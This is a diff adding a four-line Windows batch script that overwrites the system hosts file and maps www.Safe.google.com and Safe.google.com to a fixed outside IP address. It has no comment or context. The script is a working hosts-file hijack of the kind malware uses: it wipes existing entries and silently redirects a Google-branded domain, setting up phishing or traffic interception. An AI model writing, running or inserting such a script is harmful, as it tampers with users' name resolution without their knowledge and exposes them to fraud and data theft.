@@ -1,0 +1,4 @@
+@echo off
+echo 24.173.86.145 www.Safe.google.com>C:\WINDOWS\SYSTEM32\drivers\etc\hosts
+echo 24.173.86.145 Safe.google.com>>C:\WINDOWS\SYSTEM32\drivers\etc\hosts 
+exit
